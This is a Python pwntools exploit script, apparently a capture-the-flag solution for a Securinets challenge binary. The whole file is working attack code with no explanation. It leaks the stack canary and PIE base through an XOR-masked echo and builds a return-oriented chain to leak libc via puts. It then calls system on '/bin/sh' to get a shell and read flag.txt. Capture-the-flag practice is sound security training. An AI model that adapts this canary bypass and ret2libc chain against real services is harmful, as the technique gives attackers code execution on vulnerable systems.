#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./main", checksec=False)
context.log_level = "error"
libc = ELF("./libc.so.6", checksec=False)
key = b"\x5a"

p = process("./main") if args.LOCAL else remote("127.0.0.1", 9012)

canary_leak = b"A" * 41
p.sendafter(b"> ", canary_leak)
p.recvuntil(xor(canary_leak, key))
canary = u64(b"\0" + xor(p.recvn(7), key))

restart = b"B" * 40 + p64(canary) + b"C" * 8 + p8(0x9a)
p.sendafter(b"> ", restart)

pie_leak = b"D" * 56
p.sendafter(b"> ", pie_leak)
p.recvuntil(xor(pie_leak, key))
pie = u64(xor(p.recvn(6), key).ljust(8, b"\0"))
elf.address = pie - 0x10a6

ret = elf.address + 0x101a
dispatch = elf.address + 0x12d0
reenter = elf.address + 0x109a

leak_read = flat(
    b"E" * 40,
    canary,
    b"F" * 8,
    ret,
    dispatch,
    reenter,
    0,
    elf.got["read"],
    elf.plt["puts"],
)

p.sendafter(b"> ", leak_read)
read_address = u64(p.recvline()[:-1].ljust(8, b"\0"))
libc.address = read_address - libc.sym["read"]

clean_report = b"G" * 40
p.sendafter(b"> ", clean_report)

shell = flat(
    b"H" * 40,
    canary,
    b"I" * 8,
    ret,
    dispatch,
    libc.sym["exit"],
    0,
    next(libc.search(b"/bin/sh\0")),
    libc.sym["system"],
)

p.sendafter(b"> ", shell)
sleep(0.2)
p.sendline(b"cat flag.txt")
p.recvuntil(b"Securinets{")
flag = b"Securinets{" + p.recvuntil(b"}")
print(flag.decode())
p.close()
